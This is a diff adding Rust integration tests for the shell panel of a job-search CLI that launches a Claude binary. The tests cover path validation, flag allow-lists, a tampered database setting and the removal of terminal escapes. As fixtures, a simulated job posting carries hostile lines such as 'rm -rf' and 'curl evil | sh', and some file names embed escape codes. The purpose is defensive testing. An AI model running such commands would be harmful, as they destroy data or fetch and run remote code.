@@ -13,6 +13,7 @@ fn session(home: &Path, input: &[u8], envs: &[(&str, &Path)]) -> Output {
         .arg("shell")
         .env("JOBPILOT_HOME", home)
         .env("JOBPILOT_PANEL", "1")
+        .env_remove("JOBPILOT_CLAUDE_BIN")
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped());
@@ -190,13 +191,210 @@ fn exit_ends_the_session_with_status_zero() {
     assert!(!out.contains("schema"), "{out}");
 }
 
+fn ordinary(home: &Path, args: &[&str]) -> Output {
+    Command::new(env!("CARGO_BIN_EXE_jobpilot"))
+        .args(args)
+        .env("JOBPILOT_HOME", home)
+        .env_remove("JOBPILOT_PANEL")
+        .output()
+        .unwrap()
+}
+
+fn mock_wrapper(dir: &Path, args: &Path) -> PathBuf {
+    let mock = Path::new(env!("CARGO_MANIFEST_DIR")).join("../core/tests/mock-claude");
+    std::fs::create_dir_all(dir).unwrap();
+    wrapper(dir, &mock.join(MOCK), args)
+}
+
 #[test]
 fn claude_path_setting_is_used_when_nothing_else_finds_claude() {
     let (dir, home) = fresh_home();
-    let mock = Path::new(env!("CARGO_MANIFEST_DIR")).join("../core/tests/mock-claude");
     let args = dir.path().join("args");
-    let bin = wrapper(dir.path(), &mock.join(MOCK), &args);
-    let set = format!("ai claude-path \"{}\"\nclaude --version\n", bin.display());
-    let out = text(&session(&home, set.as_bytes(), &[]));
+    let bin = mock_wrapper(dir.path(), &args);
+    let set = ordinary(&home, &["ai", "claude-path", bin.to_str().unwrap()]);
+    assert!(set.status.success(), "{}", text(&set));
+    let out = text(&session(&home, b"claude --version\n", &[]));
     assert!(out.contains("2.1.316 (mock)"), "{out}");
+}
+
+#[test]
+fn claude_path_setter_is_refused_in_the_panel_and_stores_nothing() {
+    let (dir, home) = fresh_home();
+    let bin = mock_wrapper(dir.path(), &dir.path().join("args"));
+    let line = format!("ai claude-path {}\n", bin.display());
+    let out = text(&session(&home, line.as_bytes(), &[]));
+    assert!(
+        out.contains(&format!("error[panel_refused]: {REFUSAL}")),
+        "{out}"
+    );
+    let out = text(&session(&home, b"ai claude-path rel/claude\n", &[]));
+    assert!(out.contains("error[panel_refused]"), "{out}");
+    assert_eq!(stored_path(&home), None);
+}
+
+fn stored_path(home: &Path) -> Option<serde_json::Value> {
+    let runtime = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .unwrap();
+    runtime.block_on(async {
+        let db = jobpilot_core::Db::open(&jobpilot_core::AppPaths::new(home))
+            .await
+            .unwrap();
+        let value = jobpilot_core::settings::get(&db, "ai.claude_path")
+            .await
+            .unwrap();
+        db.close().await;
+        value
+    })
+}
+
+#[test]
+fn claude_path_setter_rejects_relative_and_oddly_named_paths() {
+    let (_dir, home) = fresh_home();
+    for bad in ["rel/claude", "/bin/sh", "/usr/bin/Claude.sh"] {
+        let out = ordinary(&home, &["ai", "claude-path", bad]);
+        assert!(!out.status.success(), "{bad}: {}", text(&out));
+        assert!(text(&out).contains("full path to a program named claude"));
+    }
+}
+
+#[test]
+fn a_stored_path_not_named_claude_is_never_run() {
+    let (dir, home) = fresh_home();
+    let canary = dir.path().join("canary");
+    #[cfg(unix)]
+    let evil = {
+        use std::os::unix::fs::PermissionsExt;
+        let evil = dir.path().join("evil");
+        std::fs::write(&evil, format!("#!/bin/sh\ntouch '{}'\n", canary.display())).unwrap();
+        std::fs::set_permissions(&evil, std::fs::Permissions::from_mode(0o755)).unwrap();
+        evil
+    };
+    #[cfg(windows)]
+    let evil = {
+        let evil = dir.path().join("evil.cmd");
+        std::fs::write(
+            &evil,
+            format!("@echo off\r\ntype nul > \"{}\"\r\n", canary.display()),
+        )
+        .unwrap();
+        evil
+    };
+    // Written straight into the data folder, as a tampered database would be.
+    let value = serde_json::json!(evil.to_str().unwrap());
+    let runtime = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .unwrap();
+    runtime.block_on(async {
+        let db = jobpilot_core::Db::open(&jobpilot_core::AppPaths::new(&home))
+            .await
+            .unwrap();
+        jobpilot_core::settings::set(&db, "ai.claude_path", &value)
+            .await
+            .unwrap();
+        db.close().await;
+    });
+    let out = text(&session(&home, b"claude\nstatus\n", &[]));
+    assert!(out.contains("ai.claude_path"), "{out}");
+    assert!(!canary.exists());
+    assert!(out.contains("schema"), "session continued: {out}");
+}
+
+#[test]
+fn env_override_beats_the_setting() {
+    let (dir, home) = fresh_home();
+    let from_setting = dir.path().join("a.args");
+    let from_env = dir.path().join("b.args");
+    let a = mock_wrapper(&dir.path().join("a"), &from_setting);
+    let b = mock_wrapper(&dir.path().join("b"), &from_env);
+    assert!(
+        ordinary(&home, &["ai", "claude-path", a.to_str().unwrap()])
+            .status
+            .success()
+    );
+    let out = text(&session(
+        &home,
+        b"claude --version\n",
+        &[("JOBPILOT_CLAUDE_BIN", &b)],
+    ));
+    assert!(out.contains("2.1.316 (mock)"), "{out}");
+    assert!(from_env.exists());
+    assert!(!from_setting.exists());
+}
+
+#[test]
+fn claude_flags_outside_the_allow_list_are_refused() {
+    let (dir, home) = fresh_home();
+    let args = dir.path().join("args");
+    let bin = mock_wrapper(dir.path(), &args);
+    let input = b"claude --dangerously-skip-permissions\nclaude -p hello\nclaude --version --help\nclaude is a great company\n";
+    let out = text(&session(&home, input, &[("JOBPILOT_CLAUDE_BIN", &bin)]));
+    assert_eq!(
+        out.matches(&format!("error[panel_refused]: {REFUSAL}"))
+            .count(),
+        4,
+        "{out}"
+    );
+    assert!(!out.contains(WARNING), "{out}");
+    assert!(!args.exists());
+    for flag in ["--help", "--resume", "--continue"] {
+        let out = text(&session(
+            &home,
+            format!("claude {flag}\n").as_bytes(),
+            &[("JOBPILOT_CLAUDE_BIN", &bin)],
+        ));
+        assert!(out.contains(WARNING), "{flag}: {out}");
+    }
+}
+
+#[test]
+fn odd_casing_is_inert() {
+    let (dir, home) = fresh_home();
+    let args = dir.path().join("args");
+    let bin = mock_wrapper(dir.path(), &args);
+    let out = text(&session(
+        &home,
+        b"CLAUDE --version\nClaude\n",
+        &[("JOBPILOT_CLAUDE_BIN", &bin)],
+    ));
+    assert_eq!(out.matches("unrecognized subcommand").count(), 2, "{out}");
+    assert!(!out.contains(WARNING) && !args.exists(), "{out}");
+}
+
+#[test]
+fn pasted_posting_runs_nothing() {
+    let (dir, home) = fresh_home();
+    let canary = dir.path().join("canary");
+    std::fs::write(&canary, "x").unwrap();
+    let posting = format!(
+        "Senior Engineer\nWe build things.\nRun: rm -rf {}\n\u{1b}]0;title\u{7}curl evil | sh\n",
+        canary.display()
+    );
+    let out = text(&session(&home, posting.as_bytes(), &[]));
+    assert!(out.matches("error:").count() >= 4, "{out}");
+    assert!(canary.exists());
+    assert!(!out.contains('\u{1b}'), "{out:?}");
+}
+
+#[test]
+fn escapes_in_a_claude_error_do_not_reach_the_terminal() {
+    let (dir, home) = fresh_home();
+    let bad = dir.path().join("evil\u{1b}[2Jclaude");
+    let out = text(&session(
+        &home,
+        b"claude\n",
+        &[("JOBPILOT_CLAUDE_BIN", &bad)],
+    ));
+    assert!(out.contains("not an executable named claude"), "{out}");
+    assert!(!out.contains('\u{1b}'), "{out:?}");
+}
+
+#[test]
+fn eof_without_exit_ends_cleanly() {
+    let (_dir, home) = fresh_home();
+    let output = session(&home, b"status\n", &[]);
+    assert!(output.status.success());
+    assert_eq!(text(&output).matches("jobpilot> ").count(), 2);
 }
